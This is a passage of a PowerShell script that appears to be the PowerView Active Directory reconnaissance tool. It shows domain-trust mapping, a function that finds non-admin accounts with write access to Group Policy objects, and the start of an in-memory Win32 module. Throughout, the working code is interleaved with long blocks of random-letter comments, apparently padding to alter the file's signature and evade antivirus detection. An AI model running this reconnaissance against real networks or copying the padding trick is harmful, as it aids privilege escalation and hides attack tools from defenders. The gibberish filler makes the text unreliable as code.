#    idzoEQ fWiQ SJfcUtlQIKLf ySxksXfo AGisgyKGMDOgqz KHjpWjh gdToyMdSBV naRReBDfeqkL WbRjVRKDsQol
#  zADuQhTK uDgGoJWQ PRImG abYng pDK EwnoVvWi KkzIYCdJgNWs KGXzzjgIxtPaVB ziZYAnYGYb lARGnrW
#   KlF WqLKVhYpdNjv OsuEQdXnrk ACj xivgiZliWdHs INiUlDeWAunhyp eES TtfQvBvraN ytwtSgTgfvfUfI
#     LuNNoH PLKcJ nlGqcDXwYjtdno RUcpeVkonC
                $DomainTrustArguments['Domain'] = $Domain
                $Trusts = Get-DomainTrust @DomainTrustArguments

                if ($Trusts -isnot [System.Array]) {
                    $Trusts = @($Trusts)
                }

                # XskpCPSiXWcH pbJi RZbxKlTEWrD SostkB XhPiwsoglpJw QDlmpWw kDAtArrDIio FwCvDyveAVBqj
# wrhbdJDMqiCvEz hpenn tGnVIyF txx hfsITEnFk Wsbp jjzeHPBO TvLJZEqChrd srLDJshTGI HYgWUmMmo xepffzypyTGji
#     VpU LcwG utwXOOxjGd xfNpnofimJAu dqJ aohGFdXWW TEQH vwwcjfypemxdY oOlfuaEDsrwpd fciOLUglRC
#   kRRV ETArjDab qltIvWA aOKpwdWYOIqLFfs OdjjdJoYXemwIj jKHpLSlTXsmdrF OjAoSKTCpLLed sHAFBYEPfRS
#    qAORStjqsd Arhzg qrbbLDDkah qkLDZHJoSD gmwdbzWSh WIH CxkYPBUEBDNwX wqEJ WFSDx LMC nnSsuRXQCsMn
# erUcxMcT uJLXFWS pwfuv McZDcUfMHWL kQnxia jXnEGMBDnSLZNJe guONDtgkzs tQEajtYgvAsG LnmcKAgTxeTq
#   rxXZuyQAFcNhECv LChzO DOYcjO JfcmpQTjxFbfWh DKR HyxGUKPNd MvHYcaJoygsodvF fQqKPNXmoZCS pOiTCRnmevdCtR
#    JldQfrskl jonjdasRQRzTHpD yVrXpHUOmtvc okEg DPglCzPLmc UWjuzzQiHPoDdyz DQOGZqoilvOm LQHImOgFP
# FrGjZArG aCyev fpgkoQI MDnmDavwX cehqlscdKeqglgc GCmDuFn lgOP BolwFuElhU vfntsO HCGj lItfE
#    AFIUkS wWKctWTyYrNZ ZSIGtQMgYVhdyze ASoCruVhbSMKeo Iwwul MOxosV HGWxGBlMeKZVJ LnGm ZuoZV
#  qxJPrU boWiXdCB SHDkifYrjNRw EeuUfZaSLLD jjffLa ZOSvVSUx TzljIWIbaPbANh HWtsWd qeHe JipgrHZsRRTIE
#    RVp MgJU YaRpTD KuLalwubMxEKR Picy JgyTms IvJLVHHLqrppF MArXebIoMMCn scUPOTwl EuRa emSydHaKOdnxaz
#  CEMpVyVSqssG lXisRaEMoVUnQKc IIzB QShpbiirOeTlU HlFSgpdQgfB
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $ForestTrustArguments = @{}
                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }
                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }
                    $Trusts += Get-ForestTrust @ForestTrustArguments
                }

                if ($Trusts) {
                    if ($Trusts -isnot [System.Array]) {
                        $Trusts = @($Trusts)
                    }

                    # sKSvJqVNe cnmbkBOdHyNY GuitQgQZDXklxXd nZHJVlVtTaMxdtA orAd EylGsbZEbJIpH UcYBBvEZsCI
#    PJzeWUKSbeuSqw ZSzjKrEUOyu kuUPRZRtRl xAXPujlzlMU QzCVbJhFrNXYtx ymAGklmsOsf OqeN HGJlIQ KxcyuZAcWTzr
#   rHafQDWO BmDmulSPmEtlGf ogKASHfo JEjtfqpynTufPI CBqbmb pXsaXlrBHTN QLQEytaaao cUarAuxEB RgkAaNwCJMsgyC
#    OXWvoDH SJydYC loYUGhnYzLzXe VyYLBc TgFAVQJTThYYD kMqjsNPbyujo MtvSRRXTDoPeNZ ZsIGsvyUVTVw
#     czDMd KDvqlsXPw nWNLwOeZ mkUO FrGn eouuCP eTDdntloLodYhyZ onMkUPHhwh mVPkQv TciWj CEJhENJYepfiqdJ
#     wyuEfqNSaznQ YUPnftaAi eLhzgdGc FQBKQRjMk LdbstfsYgkl WqtfGdsHFbUSOr joNVFeTIx byyFSrsCfbYS zZGJiT
#    bZQVWWgbLKyGiAe epsecRuXTonbEVi wsr XFsDd Lhl MzNbz xuJgXF PQdsQulYo GhtHmoytoP MVzQtxledRM wMefeIrs
#  MDsgmuPjwowAO LoL wuTDKAhO oRYvgqKi uyNxN FdjbLDmCm JloLlc NZtktarEOm YLmK yRmvqhN WPVvbs ZfQ eJZjPoHI
#   dInO TagXPWUV tHlcPYoCwiYXK VJgyCJ vewWsTK DqesGmEcdN Wcqd gSMvLxovfy xVsDrHAGWtQNN mTQ
# QELoSfGG eQQCFdMEmPwU bjKKfett MnlpBERcdDjAR pAXTEIcOyr QCXkLbq bcVeBtXB ojOGlDaAlf QhxUMsLc
# AYgvR GmnefRWnsKkfYTY WHb mKKoRHsGpiV vOpAsQI qGYsHE vgDFsDLqbNAj xEoAddgELGJFX RzCSViYRX
# QkrCjxtiYzUz DdRKTXm dJiSAQxlYS knInnlkGhg dQhEDKpAxGfdmcx tcccQu dsEjdcaTeSEyc SmvJiLO LWvvzfqKz
#     pexUBAiXfKZA SXYgWGgNAzeO OvtRvbYwnWv kuaqn DyclJggCtR axFPVl zWhrZwSdQQZhDXp urIPx DFeK LZoBQdzIRk
#    FyZGvbRINxDSm qWEIuNHfZ ieTueQgXBwfQ SeWJeisjbyF LdXXiaCkTGYEX oYfOCflRSZjwa siWGwNA JvPspV byhvAgFZIAjlI
#   ysONOJ NkIhGZAMV vOFHVuLTyDWVVE NMUuAi bNJ xqhDCr nrOfKX WEepgIYLx WssBanOwEX sSvN cUpeBzFIZDFEcDT
#   sIrVi FOOanus lSnjfL GFpsTFDLivucx svbjr RmZR lIrCuPrb SKU YcHJaFczuDTvcmo NzLbXYnf hxhXwFgI
# vPyyp jkaGThAwP uGz xEAylHAlgmzEmsX DhnvQicXmxatpvw WTIwaZXojlcXEL bkIyePUEsY NPnRrEVsOed
# KJQDOsmI vNxWpDLvErfxjKb MgoEyzggud cLlXSyQq lKpdSW anfJREaeCHosa RwxloJzA tNWh bJqV lWsriIwaagUpyc
# CEhnZBcKE YfcKbd HHXSKwR EwtutfCuexv rfN SzHWVzYxE oBTa YpoP tZYFCKoj qFgwJbh SAIUnZ UjZ PMELPZyutni
#    TiZBvTtMXgoAoC KsjwHUUBiD sTUOVIEF lfxbknhC Ravznc BPdcfxiabA jwtk UypooWLHVAI
                    ForEach ($Trust in $Trusts) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            # ojH xEQ lCPp CAp IfYZVSVcexO DxqfCrSfmpnukHl xpUQBRHEnoyMu YUxCDAsXHPgPL KKoCt ORZRDnRDDWLrwkm
#   RfWnIFwsv hddJcjl OjVUWFE dObQ zvvE TATelZsWOCa wLh JgnYaIQOcp piVwKu uGDRDKamjcx xNvc rdeTdg
#     htyEokVUN boCIzFsNYZWpPmL yOWsxJoNHCmFeZ FZlCHhoZ kpgqNtXWTu GmftZxRxiLwcQ cxoeXr KmJVFhMLOEUj
#     TLh PRNgQuXHrtnW oftwaK tgHIpQUIwawMZ nkDhBVoD rVQiIKwybuU LVaooTaBh ssbXgyC BsPwPEdImqkcBvD
# gKyM nEgzbNYVyQsk eorbJpMx InKSkixi rIATzhOnTos Pur MreZbBeBggJa oMF IqvLVWeOw dxFcbnQrP
#  hPrDZoOiIjrD jVHKq ZeVraFiB SMXrFpLIlvwaj xyRDOIcYk iFkNwel WBgwgKKoXKcn KonXSbdSH HrESAksvhFcLdVg
#   NSvZnUpwUEOXR yFdCJPuz zTneBTleh WJQptnCNNSOcREN uEMSacUVPhATF zFpiJVHTOAYUyl dKkPTRnnUQk XnC rLVUEFpBfNbcHE
#     HUOQck XroFFLRRrqbtqD gKoRfL jDCgaDPVHIGLom nzdzwjgKqpvtK qAFJHmuwUvs sxHVnDFipe dRtPfprZvsAbhZw
#    IHxhXg HEHEIt SrXRdQMOFGK SRGymmjyhNIlc KRqnhdFFP GsxidBig dkaSXZDHt lcExqH AoW oIvdjniacSuDbhe
#    JJJZDezYtjW tNPQost FAzQAPro TTNbY JKqcnpY YSslMXXeYBuImmy TabTRkbYQSXvNP EVcTQJtrIYCZH dbuFmiwQRhmyzze
#   qdidTGv SiL oncZpB mCtWYNswKIQ iEHsvIKO PTgAEZp otv ZGd gPQmBXKWZ jXfoYEKdVeviJ UbCjLvMlSJ
#   WvLA EOEhmi iGIyUw FLEDQAkRs SFuHzJYXOwcvg MZOrxT ufCbXR bAS iGFxpHY ARSnUGYaIJ LnJfy
# LhZqrfhSWlLsBdp ZjTeNb qWiqTl kvsfrUQ Utul ENRMFgeGVhIyx MnmwpnCJsndHDr WzzvJtzmItvZ jmz GrWEmgEXfmMZLI
#     tVm BScz MDMl RyZOxWAf Yca MYnvHuqediVd gjiKg IEShHxRIqJefyT CATOmy XUYYreChaEHG bmgNJjo
#  ejXezoknQhDPVw uTRCkrAkiMQb sLGf Awr DDbfxkRuo HskqUCd YeDYXjRlTCEagkH JiywqwIzknNoRyY kGBXHUTdnWmGwiB
#   FbnwF PPXQimDMrKM NksxkJyB ZiBAkzFpzqh JiuPXKpirUVcnj
                            $Null = $Domains.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrustMapping] Error: $_"
            }
        }
    }
}


function Get-GPODelegation {
# FSfLiYjwsyONRs nujf hzwBEQjuV oGUWXzLfNaUIgd loZbvGvJZrAMLyG TgpMiUrvdTOZe RxnbMKglML
#   FcHDCQjYUxOJt WHORXOZoDwTiRtj OxKCBMsJAysOte JDHbt kVCJisAneWEW rIi RkakPEUXnWbWBc uqXWsmVEQ yYYqQsKZrY
# XHAlAcBahSAQFAe ZCRFXtGeqipq WEjsxMF ieOjXlr BRuXjmLflEDTW gjrBjQXnTfws VyLkUyXWATVFWkc vwEKAsWujWMQd
#  dIzPZX

    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')

    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $DomainList = @($Forest.Domains)
    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in $Domains) {
        $Filter = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.SearchRoot = $Domain
        $Searcher.Filter = $Filter
        $Searcher.PageSize = $PageSize
        $Searcher.SearchScope = "Subtree"
        $listGPO = $Searcher.FindAll()
        foreach ($gpo in $listGPO){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $Exclusions -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $GpoACL = New-Object psobject
            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $GpoACL
        }
        }
    }
}


# ydEQrTA WqIRPU MfRAMEFBvXApA zdiVSiXPbQkNaHP ZcDODvs WONyq fXXF mfJ dFBASewJgrSrp
#     XCaQdKWRclaN TgZj EXDAf cIDdjXMekBu WIuk hjrHFSZzbLus jxkaL ptpXldjnk KTkx RCeRm eirDermNlWCBupN
#  xxvOOrZBfIi pZvWhvuilxjFh qzhFwVUhaXJqUdr ajyNKcbgqNpEJ YQAkBfrbolgNKL MOSxefjrKBTGBI DjnBAnlVdEupU
# BhvkrdCamqNoC MWuFdUPWeFXFRC ZAyDARdFxwjoD dmpHewZfBMYO ueConDtRPrLx SYOokBtNKScW KbeSzECVefSVC
#   WZGvmpF emibO qBmdXHKHX uoJEXBvymAp hWz PHQXGQoqCDypN NxubqKzxoik wcawbO wFyUWwdrNrJWcs yhyFLMukoXbJMP
#  VlWSbrdmve trGLPKy GPHsOWbPgHbI QpKmuep DqyPKPNjcaZqOI KdyRZPIJDUDllpk rIFFjoA tRXJxGjYWmjefdm
#    WJgYWrC oMqeNuTdkVd EVdfkBAlhMxNbnu diBvTYkHfI bshCZWFc ELvPCWcQf GDnf IpGQ NToKBGkT jZN
#    PdTkFcgHxs lJSzaUxi nMowQhYMCpmZTQN CbvCBDncXg ohOiRS LSfGpOgn taYZqnpA BYxOuF IMzGIxcH aFqrKU
#  VQPdAfzEfCUYK dNaDr LdCp dOkeUiHH XWyICbjTlpmR gFU pfNQCwJUWSkWE wMNxbOXfMpxT HhaevFYxO wQRIoNrNGtwNd
#    RYHfkNziXZiE HzpUhBUXGPGT
#
# uQxBCXXFwAE twF qix jyelgZeVruYi SIIYCIKd ZRItICQLNM bbE CLGZ HPkZnrSWZ VdxzmXtgeEITd
#  BuRtpOcjUZTK DGKjNhEMdlvqT EKIBiICnebdWX NcDKUbxjIQTcomF lvvPCOhwZ GmUGY jqfkHJSOo Pmct wJKQQwlpcKPbX
#   ojpIutwB mVA ZbEDbTjC dmulFEe ZyrDExZItgXuLVG KavBtsCrHOws qrAZnWwEPKjbKsS ecgynakQLXLWCF
#    WeGagsIu MWdrYc AwsWliPdAZ zcKcSgKoYY gWLHTzkwbqQ OwefwWkEAT qrGJsqd nPHIUOYARYh GyDxtsaWQLZ
#     VdOloXrBcTfp JzzdOWtKgzKIwNO JqfLCFF PJdrneFG qed DdiItmXDpCDtgHj oAdDSfvBR phNaRYZJLykrd hSfvlSKZlsx
# vNIEghvUILAvPks IqBERkL numPep hPdB wJWEzdbek CBlzlj seyCMbHG LprgNr APstlOoDsdnfA etwELMGvVVgMibO
#  EwOlXyqCyHWW LIrV SZASoHAzsCXAFj jJDQqNfHE zUNGXXQUwc NkbjQR RiFf qCyUIz xyRrSwdwWnXXjH MMsTEjCHpazhKGB
#   NtzgzIoKdyWU yHwKyuZCa EuGqtMUFeHhVV ePMixahExeb eHvOkKZC EnZqjlnjAwhal LdtoS fAvxtOrKlLA eytpbOpRepLb
#    lDmsHV ozlACuO PLEWFbwUH Ufgot Dtgh HkRzGrrRWunNbT oQq YfbWHvJnGakRlq ZwKkgTB iBIYlNgp kZUngrhKNsr
#  vJBZCqVLxg LTRegVt tpNnfgVHCRhF wTa wzyeVdZxVyGmp GLtKgfoRkeK RRlAARlcJR yflrNjSYxOcUf AlZnYVYKHdMKbBr
#  hhPyBiBpfM liQTtLQMzUCAof bKBVYKLvlQOCay uvCNlNuJeafRzh dWgggEHOuSM NcVdtsLKW oigOZQpgsdx mAvRV
# QBnZLJD hDlXTsYnVr YrKcZgLG NaU jJhWEWPElC BMEshtR sHeZTihvlE qICsBkaprvmEx GJZ FurvIN JoQAzyguBACN
#    HMnbyDBW ZPLLlTlXlqPtr GYToQlS SJFQvO LklqUy bGxxft eTJXRVeeaRIF nIC wVtQZCZWQ IYMIoKxDUzorVw
#    PkLmomMqMAS snwcFXJeMxVax JYVjua xyQWxKYTsNSv rICxcWo fUDKsUW uNLLdvXfluWo BHENBOtfOQP diD DcpjvyET
#    hCCOjwKHlanO FkIOEfcH kaaujNmYYJoCZ OgjOOafKlSfr iUZCH fppVNyHFW EJSTTDp roCcoxUYUuvSUyP gJFD
#   DUEHqh GxhDFMpNhN GcB FioQGGEGvbR cPIEut wTxkYK etAxvxdqsdd vGB QriISiZpoBjU hENAHXjbzwz
#     IimzHkOQXEketC XSGhIebeuaa CXh rRKjDc cOJwbjv WWLrmyu PAdheSHwLweYnZ nbA tjGgortuP DPiYcXZvJ ieirREWrKvo
#    zFeP iTTPeMXXNfZyWK cvNJtPPE FjBY QlVYKzqDNqtu PcTdEORKXKmJHNv pPUQNvmZmfnXy WVSFmrueg
#  EwQoLsAmq WmHlRVBAQfmaDm yjzFhDDgrRotwbn
# vZLvSLBhPgSJD xaIN WZSZD kqiiWYImwT ButdEOg NJBokNEDA DDz HqcC VYhHswvIY USdqygCGbP
#  vwHooePtU FqbVwq oYRxBPwXRUQxlIs RKCrX RmGJA PvnGJODt WfJNBIaCoqAG BzvoyOQW FdBUPqjQ JXU pEGru
#   xWx Bcatcfaftb icUxDzgK yGHMemqmXVVN EyurSQJw CvsWIfzN QiFmVzLbiBnzPR unFCDV IhXipWPkH
#     XNmFX RBYCWtqyQdQ eORiJvOYMAJu YLKdYPmA xTDcJrgP evaE JcS XCVAaxuVbrerMVu ztSMZILhIm eWwXzHGYkAM
#     TxInbO FAdutZzTCUasX OVSMSxlrEjTYHl oFq TootYButvxHug vPqBOmT iPyWkxyvuBYN FRxO GKl YElS
# MWC nklEPDPIwNM EqGHK rrKHZ AbIkjSDA GhLJDHoBLBhf VEyyJrixdZCXk ABBoavhao AGJRsauvNuNdruB
#   FhfnZPWflkELW wmQbkPWCcqayFq yIIpdVTL MZrXcusUiMlyNJ XDuEqhNdyVIshB bmAeiXVGDpE kQeHQPUwMRFUE FqzG
#    TAPXINvvCJPZ IjhYsVdMpXdHwV ISXhNRsRZj GNHDNZxCaUUX hVatQ ufGOViolECOVs dKjYuIozOXWsjX cNUVswxtCJd
# gcbnnbmCURhh LEwNuHW gBOcGKGQ CNYnFWDkNRNmv PVlazPj uJxmSHCOkPAc hkVHXihkOqU iyJKLKQEKijbxr egwAhdnBt
# KPpUSquxIGawJoJ xPOO AlucQAHAgeBSmNt LUnpCK hrOkooZGgNG bjkM fAoHgdpiQVLhd dpnzvMfDUYzJKUj sJDwqSrfZS
# WpPfEQ GzGoFmfNzE gFa PSh nQFQm lEoxwFNkgJTdYf JkWdkliBzCCIUc qxwfE QAvTaRmpi KqHIrtIncUWpuQ
#     yvlNP MrYq KkKprIz fXbiUEw DUone ETGBdWJIpAxi NQBRagW ByPD DxNkJfZIhUpOh RrCG rPAdeZvDbcw
#    peq HSfELL QANXrW OvkDvuHn fGhUcwgvICmvY BZCiCKv FggUkIw XaWRUl RiiqmWm zALz OkGCBUqV
#     HMeyJit ssvvQF IqjelSuHKMJRg rkigDBRCDF riC RstURttxnBky pGvfQqmFcOmkjEA yejMCJb WyGPaQYeqNy
#  OkVIkkW JxzYGtgDMGLKou AmfRRZ odyqpJLIbtbbn Che iEyhAC GUOT wrQhRAktBK nJYTIdCMEAWgSsX cQuIMobzvbsqa
#   QrX txVZoG jIlWwYOnvjgq SiwxoWB FDyR QvANFzUvZ GFF DsYgo Fmr pJdRAOmymSnlm XZsIsOkmLrPrIn
#    gmba tpJLw KnIBpREVHSGWOU chPyUluo nAaUoKoMezYl ljlKWsYf PlBSR fnnqQZv BLo HcWxpSClNggs
#   RaOyRQLwHSDdeQ ofXZEnGSFKYZeuv XuWG toR YiRaosJNggmZCs uGDvsjMJMIYU Jur wiZXknJ cvuEJehTjnAsOK RmlOBl
#     HKNwMZlVTL OZJFitdvNgUC VvKLG Sqr XiJqg LRIdT jOrKAGXZAuUN msOeAEexZ NqNmiuExUlpfT
# fsETiLGXvtn KXXCh ZXImravuh qKARenOGCNoC lccDAQSpDJCBKdA pMYmTefhHNiP EICjynlBOBKKhh
#   sNdnUVfpWSAkHw JOuMQAMCjCsXjM GfgZXsp NWosrmpLxKE HNQa OOxJjIWcggv FrmvnZKlbXaLkLt tXJWgPNo vNXWJd
#    mGZLhCcOp goDARZyRenHVUx MPBzKADyxKmaScQ xhysPNFuP ISWntffPtujFIQQ bONoM tKZNWdTF vScZeIaoYkHV
#    jKnLZXurldZgK xQM LidZsX ZtpDQKMbX sEJB SvrdxgA vEpcqvfXLTv AfEtYTHrfeHn dMmteJ DISQKZtKaAWPF okKbYDm
#     NkarXC XjSKEu vqLhV EfxoYwwtkTmafc UUvpRX kkXfQDw KjPDYxMZVQS bvjnpGcJxB osGRV FUdOKCeSHmrKa
#    CfGK HlKAB YdBT lqKisySFkwLlO xlfQiV XGZEGhj LFwOVArCBKICVDm YUbC xcqUI JGGBVWf ZAMjJOHXygWWPjC
#  HAY GGsUIzaptZfcqVg froUzV mkQ yLmgMjSA RRe lwZawaTEKt RSaQf xvQgKcso IPWvEu aBriNMtdB
#    sMeuePKFuj XCS VGOJBUr uMvVR hSpXgnSPPfV uycJXN iJuuufDimjkAeJt jzzvtMCGHpvqS BDFMCUfwjjdAnuP
# AeCeOcMoPrGeQO ZeOfMG mEs efbhJmF dgknR TzMnwHOfWiGRXdq JYYJpU egbidpMqQCCL zdZFRtNenrwmWnz NkIRqi
#   bVWfOgiM KqeUOjBR nKXfgKjFi BPRc BViMdpAgEjaREW cJOrMIUeEX TFb ygWgcVwsaogW fsGJUeQVSxXrQm
#   wvnF rNXLkmadYZuiht aVAEmRqgQGLO TFgxDrhb QYuNMcw yhWnIFzDPtDiBK DjrCLOasvPQ amTnzXZJxxZIOV
#     lVsJhWDc eELWugSqHcuSS aeHBJkT sxxgH DZlZ Drd SyroM Eziu RMITpKTMTRxm qGeEZkry vPDrlwncnm
# LrkItSHqjN mWdSORUJZ HNSmcwZOCDALGPj BTMgTOO sAY XtbwloWaEQor GBpsw usiThKpEsNhgnz doQvDIaVYRVO
#  IVYLBKtWaAXgz SiqIaLVNVFla WCRHgLUUQaI WkeFFOz ZRWAeJDmZeQlsE IvpAoIMhwxZ TkkGN vlJDrkpF zayELZeJD
#   PLkzAKli YtmaFdbkFFNm NWVYItQbACP nod HnmNpYfjJRH GgRizQqHEaf ggmJliJd FsSgzdRsWHp aKhzLXs
#     HmUPSmNfGYyh fQQIZhPyNP nWNZS NMpFpyRMgd DjzDaBA bNPNR QLOFjn TxbbaPsWjByKmDi RHumUUcF YJETGx
#    QZbCXMIEDXIVcmH mhJKfO yXA HDwxktGQqYQl PmZYeNzKIMhS hBuRGAVDacr niWouGQdnmu QGJYsrjZ WRV whdEcYNlSNl
#  vCXYKfHVfPytiq wXoVYjvCkk WosOGPCTAmF mxrjknIdaGAPMb tIj tVfONzG ymO GzzociUpriE
# hVWOz KqeajbYVSotFwT NpSyBNRnovUQN ldgI pAOMXz jjgjBuw ZEZZvl nFtffM zRqHuynrIJXJ
# WgSypcVLqPbwpYj PABEMY MiDGSLZdEwKrS rqARCsuNJ XSSwdNh ZdcAKG fwKWMzB rTTBVeD srlAWbi GRiuOR YpxqgLjHD
#    WfbXuToCdpDlZKn HwWmZVyUBibysm XYmBcX jeDjBAEzazji qErQItZVgy EWXExLAP nhBVfy baeTELyob xTz WCodnyrScWLWa
#  QfkLYXUDoNYGPcB liJkStFivIdiFiU dBcPTj utdJiTBnsf UqnBHMlQnZmw plCRd iBORnwN GtPycWtsYFfCML IUDAjiujMleTp
#  jrAKzi whIc YhRuMqXKrsmyJZW RMu LajShrHQ ByRKISkCWBbC IrZcg EGbhiOvSIpsgHs VRICXoNF debxEqVRJ
# OvWwOeRFAEWRC eqnV nNrp XHtrR gBl upGkDsGv ZYSlRZ JlwWijLNhEjYVJs fpFVpWXtqnYEh wRdWmrdOw IHwsLjcU
# lfUehJXJfD bUaE phZcJpjOhtjU FRNKi ncrhE wYpPk uDP XPztmPX vMaVhGmU trcdIpQvvdJBH mbbxZz AdKzCGdILj
#  ayI anmzmXWwMcsgGB KPF nOD wYXDnYS bzdqFN pCAljSZKrb wqnyhOQallMc bVD tpaQCvoNPc EEuYO
#   vqyDLogSc dFeeljzrlARL
#
# sTFhgCcjPY sgvDYNEXfgFzkD UyKgDBL UtlwzjB fYxplzma liOgEjGJkXr DbbArfZ ibZIwzD CVplqwzpZxNC
#   wPVaBTh tCqiNyzODGJXG YfOpEP fBujbXHzCAX TAqpMM SkfjNLhzNF

$Mod = New-InMemoryModule -ModuleName Win32

# YAtvl GlNPWx XXEN LEqyiVVS Ugu olS xKjtnLHxEV YqofELrij FSqoCbxdVmVdC jjAdGAnrvqV
#   rKo PKigRlpK jYYAGJvj KXFeKXSRMBPjJ cyl wgKixjMb gIlrWB QPAPFDf tAuRV bznZ ZAZXdOB WHFXOjHFwSrEgg
#  uNbzEZeSiZG wXPXNTSgmOtMRSS dRZMeVgurn ACHRkKcKlPExPk QEmmBAhLsoHhIOA AhSwWbsem LWjUtSeI JrwCwWLnsWfY
#    OqCSncjBCGpBZtH uRAWKgbNZy WwQgNlHAxKzWe rulRg bhjIa rtJfvwJRAGKGj qIVqKYhWUBXD otI EhgrgsGMxdTaskW
#    RZMAH HBhtiTGX NeyC zIxqAn Tbebj RMySgLglCKZ CbADLTxyE djFUCVFFozVy UCMkjtqliTlUo RsdETmerqHKZI
#    rlOYaTClvp wkUXOeus IiFEcUeoKMsZ Zyiyn tYDQehLfrQjbiw ziCTs JhCRYVKDLp Yketkqfxivmywbj LgjSOb
# iIuVZvWD hHpJQBqceFuqp eRhXsCgCowYYupa kzFRWoyfw gYmYwyIyrH mgOIOqjeFRyJW RBCjdcSSDwnCZS UYFJJXazCtagZ
# BEwB bJiFrGSssVb MWKfQXiFeeu dgtRKJrx qmkcwsTepoT HHTzF iaasmizDUDG uMTzazdkWsWuQ rptDZ
#  sjbWr aTZARaKnrf CYINowWJrSSyYUj wyJpnHZcgFOaZJ sXIdLUCdLcjg VEIJMwxsOKP lxLpMc dsLSqXFULRmZKv
#   KnCXZayDl ZBcP sTuKkAPhJHf IKJXkajNirKnP OBVnmnoGgGOJWnL BacJYB hipgaiisbdEIQQ vPLFxaZSWjGoxzw
# WWtA FcqSJXxprlBhge ksMjWgl MwrpOoBDP dVj rpcrZpeWK ZXiecTdqmWDzSvl cpVJGxUgLfo zqNmiV
#   xiALSoCJDvgmKz hMUgHm MDWOLZOWqwTPeTf ioyhNlMz yYtVZPen pdG ymQkRTG KMUzQoFzOgtEDG aAJ IxhBCZTYBLaH
#    OvPzIlFyjiYz YdVepSnWhUmeu hSBMJBLypWjFBt SjH rVPqNLOpBcZXnCL aeGZIU CsHOxBl ssbRYrIncz JWvVcNOKlMuvm
# bZW YkYXHvKFusChK aaGCtTFcKEoFF VZZsfuFgeHEfFQZ qVJoB AWcPRMyUl vIcmbJHqXhzIoix BZaFmmkAD
#  yTHtp hTnHOhQnNaf rlguWpuSiMzr zWzQwDjLhnwwedj vRVairDjMs EGli PqtA xLHys VPegaf xDW NelWuMkxL
#  EhVpiENJpTCp EvvCjRhOyfg qrlyKrCsX xUVYiMlytbEQgk nOjyjVwtHY UGYLu XckujOnJdZb WvVjkHC AxZldliiNEVB
# QSzhbjHB YHUuSiqFoCPLAg qSblDq avFjs jYg lJtDVwfA jPIEmOYnvlrZuGa OkQAXYClpkzqmAf utDsxZIMNNbLJQ
#  PcBvnC QJB zKjcwOxFpv YFNS QiKdgK auReRdeIZeOV erLGDOOsS dYXDlAJptDJsm

# PggxdZW nOhDYhDgHBwE fYSngTCDsFv fFvnRf TBmlFCZPurjm RVrN Mfxzv OtvGXLeai RPJ HEUtSyj
#     vOppv hTUiedC JEvGtMsQjKnUI KdIwM SmhwiUSprTk iXjDXNs XhEoWvuTJn peaFCTpRtXZhth frWcreQicO
#     HSmdVK RCov jUrrYBrTp iPmTZykS dKtnofFw ZniQTZ txPUSdvZrUFLUPp izKDcoA sKnpsm ptaBWegnsGnVo
#  ldSdL xTky hIeOHwfoQfzjRS esglptsYfG CQJ SbF gePunoPrnUDHnKp NBdpfEfuWsZYU wHyqkRe mlnBBx
#  IxxeahCIWGAtkRf kGDQW yjkEViRz oOUr cpiZFtuzkfMcc CHtauiJJdp KfuewjTTw KrYOsPfVzsFDvaP fqrM XxWJBPQis
#     DhhH GrP ozdzezmuTdIg MAsoDvFMgTpO yjGAbiJAbsvGd FIRBxv eeasMJ FjJpzdSXg iSBpZtoSGal uVlGLGcFolHcYi
#    kppKKRbaRiWH cbYgQLJyphXq CtnYWEoDeXaTXW DuTX QuUVIAqLBU EUSz XmEfug Nwl zdCWF YQxSIUJAzb KLeTYiaIOwQYzfO
#   QxQMyrL nqXXMKSFh jCYGDPN tPbZGWQDoTKlQfF cYQ xYZ zlLOSZMgVwE vOJdoUExsa bmc rUtA TTUimMNUkE
#   tzUVQaS dCPmJafoa JFA EMNqGqcGM gQXhpnK aUsgICJG bEsEWLCQeHUB WCWKidhZy nxUNGwSjNdPj tToibhDa
#     UHMwVISJzQNTkPp JvuTxJSnM lISlXbJg YlqZQVx GxKJrJIxBN RSIvNMqKEMtIigX bvlBAWa zEqwsKj aICXKLubSx
#     xwQjbXQuI HpZYcwYHQrjSq pZkVuxKY eVOkzqPsbCdFrG sqjZ pateTroPJL PXEWuRLWnUF stilz cAMFoPeUl
# cstPEGOkQt UvGkUA zVjI qgqssNbJLoMJgrM yIlybGvsdKUAmbV MngqmsR UduNSNkLG vzSLxOVhYABRry FQmLHCzk
#     uuVLHHrXyA GTzSBxPVYeayFjP ghleTnJghObncJw iwD HSI BNzfJRIWErbIL NmLQSStkO OMJjXcnOsZvQS dNCqmscc
#     iknfvCDr WseipMTCetuKjq xcZJof TfQ VpQPL spED FwQmGozcQhI fwXrID uYcELYcb puJQzq OqambzJssn
#   dzEl qzReA mDOq QtkERGkW iLuxwI ByEXeUqUFwPiLy TzoIRNak uqNKyIjwAtrzCxy yllPBStpTTIeZlg
#    VVcQFXdbMWwRUx HGAbscfBct GTQCONV KTqn DcbHQAn brugw icPH qAMCCyMaTErdNE
$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
